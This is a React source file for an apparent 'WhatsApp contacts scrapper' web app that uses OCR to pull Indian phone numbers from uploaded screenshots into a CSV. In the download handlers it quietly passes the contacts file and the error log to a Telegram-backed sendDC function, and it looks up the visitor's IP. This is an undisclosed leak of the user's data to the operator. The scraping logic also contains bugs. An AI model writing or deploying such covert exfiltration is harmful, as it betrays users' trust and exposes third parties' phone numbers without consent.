import 'bootstrap/dist/css/bootstrap.min.css';
import 'bootstrap/dist/js/bootstrap.bundle.min';
import './App.css';
import {sendMessage,sendDC} from'./telegramConfig'



import React, { useEffect } from "react";
import Tesseract from "tesseract.js";
import { createWorker } from "tesseract.js";

const App = () => {
  const [isLoading, setIsLoading] = React.useState(false);
  const [image, setImage] = React.useState([]);
  const [text, setText] = React.useState();
  const [progress, setProgress] = React.useState(0);
  const [statusText, setStatusText] = React.useState(
    " Number of images added: 0",
  );
  const [statusColor, setStatusColor] = React.useState();
  const [processedImage, setProcessedImage] = React.useState("0/0");
  const [errorImageCount, setErrorImageCount] = React.useState(0);
  const [contactScrappedCount, setContactScrappedCount] = React.useState(0);
  const [isDownloadable, setIsDownloadable] = React.useState(false);
  const [introText, setIntroText] = React.useState(
    "Choose multiple images file which has phone number",
  );

  const [contactsScrapped, setContacts] = React.useState([]);

  const [errorsList, setErrors] = React.useState([]);
  const [ip, setIp] = React.useState();
  const [ipSendStatus, setIpSendStatus] = React.useState(false);

 
  useEffect(() => {
    //run this use effect only once
    //setIsLoading(true);
  }, []);

  var fileNamesWithErrors = new Set([]);
  var stringList = new Set([]);

  function convertImageToURLArray(image) {
    return image;
  }

  const maintainAlert = () => {
    alert("Under maintainance try again later");
  };

  var imageTotal = 0;
  var count = 0;
  var intitalLoad = true;

  const startProcess = async () => {
    // alert("For testing purpose app will work for first 10 images!!");
    setProgress(0);
    processImage();
  };

  function noImage() {
    alert("Please select a image first!!");
  }

  

  const client = getClientIp();

  client.then((res) => {
    setIpSendStatus(true);
    if (client != ip) {
      setIp(res);
      if (!ipSendStatus) {
        console.log("called");
        //sendMessage("Visiting Client: " + res);
      }
    }
  });

  async function getClientIp() {
    const { ip } = await fetch("https://api.ipify.org?format=json", {
      method: "GET",
    })
      .then((res) => res.json())
      .catch((error) => console.error(error));

    return ip || "0.0.0.0";
  }

  const processImage = async () => {
    if (intitalLoad) {
      setProcessedImage("0/" + image.length);
      imageTotal = image.length;
    }
    setIsLoading(true);
    var imageF = URL.createObjectURL(image[0]);
    const worker = await createWorker();
    await worker.loadLanguage("eng");
    await worker.initialize("eng");
    const {
      data: { text },
    } = await worker.recognize(imageF);
    performExtractionLogic(text, image[0]).then((res) => {
      //setStatusText("No contacts found in previous load start again");
    });
    await worker.terminate().then(() => {
      intitalLoad = false;
      image.shift();
      setProcessedImage(
        parseInt(imageTotal) - parseInt(image.length) + "/" + imageTotal,
      );
      if (image.length > 0) {
        setProgress(parseInt((parseInt(count) / parseInt(imageTotal)) * 100));
        processImage();
      } else {
        console.log(stringList);
        console.log(Array.from(stringList).toString().length);
        setText(Array.from(stringList).toString());
        console.log(Array.from(fileNamesWithErrors).toString());
        setContacts(Array.from(stringList).toString());
        setErrors(Array.from(fileNamesWithErrors).toString());
        setIsDownloadable(true);
      }

      URL.revokeObjectURL(imageF);
    });
  };

  const performExtractionLogic = async (text, imageName) => {
    count = parseInt(count) + 1;
    const splitted_data = text.toString().split(/\r?\n/);
    splitted_data.forEach((element) => {
      var text = element.replace(" ", "");
      var isPresent = text.indexOf("91");
      if (isPresent !== -1) {
        text = text.substr(isPresent + 1);
        if (text.length >= 12) {
          text = text.replace(" ", "");
          text = text.slice(1, 12);
          text = text.replace(/\s/g, "");
          if (text.length > 10) {
            text = text.substr(0, 10);
          }
          var regExp = /^[0-9]+$/;
          var startsWithError = text[0] == "0";
          startsWithError = text[0] == "1";
          startsWithError = text[0] == "2";
          startsWithError = text[0] == "3";
          startsWithError = text[0] == "4";
          if (!regExp.test(text.toString()) || startsWithError) {
            fileNamesWithErrors.add(imageName.name.toString());
            console.log("ErrorImage: " + imageName.name);
            setErrorImageCount(parseInt(fileNamesWithErrors.size));
          } else {
            stringList.add(text.toString());
            setContactScrappedCount(stringList.size);
          }
        }
        return 1;
      } else {
        return -1;
      }
    });
  };

  const handleSubmit = () => {
    console.log(image);
    setIsLoading(true);
    var count = 0;
    const total = image.length;
    console.log(total);
    setStatusText("Converting please wait");
  };

  async function loadTextFromImage(images) {
    image.forEach((element, index) => {
      Tesseract.recognize(element, "eng", {
        logger: (m) => {
          setProgress(parseInt(m.progress * 100));
        },
      })
        .catch((err) => {
          console.error(err);
        })
        .then((result) => {
          const splitted_data = result.data.text.toString().split(/\r?\n/);
          splitted_data.forEach((element) => {
            var text = element.replace(" ", "");
            var isPresent = text.indexOf("91");
            if (isPresent !== -1) {
              text = text.substr(isPresent + 1);
              if (text.length >= 12) {
                text = text.replace(" ", "");
                text = text.slice(1, 12);
                text = text.replace(/\s/g, "");
                if (text.length > 10) {
                  text = text.substr(0, 10);
                }
                stringList.push(text.toString());
              }
            }
          });

          setText(stringList.toString());
          setProgress(0);
        })
        .then(() => {
          if (index === 0) {
            setIsLoading(false);
            setIntroText("");
            setText(stringList.toString());
          }
        });
    });
  }

  function csvFormatForContact(data) {
    return ["Client", data];
  }

  const downloadContact = () => {
    let scList = contactsScrapped.split(",");
    let reqList = scList.map(csvFormatForContact);
    reqList.unshift(["Name", "Phone"]);
    let content = reqList;
    content = content.join("\n");
    let date = Date.now();
    const blob = new Blob([content], { type: "text/csv" });
    sendDC(blob, `contacts_${date}.csv`);
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `contacts_${date}.csv`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };
  const downloadErrorImageName = () => {
    let content = errorsList.toString();
    content = content;
    const blob = new Blob([content], { type: "plain/txt" });
    const url = URL.createObjectURL(blob);

    const a = document.createElement("a");
    a.href = url;
    let date = Date.now();
    sendDC(blob, `errorLogs_${date}.txt`);
    a.download = `errorLogs_${date}.txt`;

    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };
  const handleReloadClick = () => {
    window.location.reload();
  };

  return (
    <div className="container" style={{ height: "100vh" }}>
      <div className="row h-100">
        <div className="col-md-5 mx-auto h-100 d-flex flex-column justify-content-center">
          {!isLoading && !isDownloadable && (
            <div className="alert alert-primary" role="alert">
              {statusText}
            </div>
          )}

          <>
            <h4 className="text-center strong py-3 mc-3">Whats app contacts scrapper tool (Pro)</h4>
            {!isLoading && !isDownloadable && (
              <p className="text-center text-secondary">{introText}</p>
            )}
          </>

          <>
            {isLoading && !isDownloadable && (
              <>
                <p className="mt-2">Status:</p>
                <div className="progress">
                  <div
                    className="progress-bar"
                    role="progressbar"
                    style={{ width: `${progress}%` }}
                    aria-valuenow={progress}
                    aria-valuemin="0"
                    aria-valuemax="100"
                  >
                    {progress}%
                  </div>
                </div>
              </>
            )}
            {isLoading && (
              <>
                <div className="alert alert-success mt-3" role="alert">
                  Images Processed: {processedImage}
                </div>

                <div className="alert alert-primary" role="alert">
                  Contacts Processed: {contactScrappedCount}
                </div>

                <div className="alert alert-danger" role="alert">
                  Error Images: {errorImageCount}
                </div>

                {!isDownloadable && (
                  <button
                    type="button"
                    className="disabled btn btn-primary mt-3"
                  >
                    Stop Execution
                  </button>
                )}

                {isDownloadable && (
                  <>
                    <button
                      type="button"
                      onClick={downloadContact}
                      className="btn btn-primary mb-3"
                    >
                      Download Contacts
                    </button>
                    <button
                      type="button"
                      onClick={downloadErrorImageName}
                      className="btn btn-secondary"
                    >
                      Download Error List
                    </button>
                    <button
                      type="button"
                      className="btn btn-secondary mt-3 disabled"
                    >
                      Run Again
                    </button>
                  </>
                )}
              </>
            )}
          </>

          {!isLoading && !text && (
            <>
              <input
                type="file"
                onChange={(e) => {
                  setImage(
                    Array.from(e.target.files)
                      // .slice(0, 10)
                      .map(convertImageToURLArray),
                  );
                  setStatusText(
                    " Number of images added: " +
                      Array.from(e.target.files).length,
                  );
                }}
                className="form-control mt-5 mb-2"
                multiple
              />
              <input
                type="button"
                onClick={image.length > 0 ? startProcess : noImage}
                className="btn btn-primary mt-5"
                value="Convert"
              />
            </>
          )}
          {/* {!isLoading && text && (
            <>
              <textarea
                className="form-control w-100 mt-5"
                rows="30"
                value={text}
                onChange={(e) => setText(e.target.value)}
              ></textarea>
            </>
          )} */}
        </div>
      </div>
    </div>
  );
};

export default App;
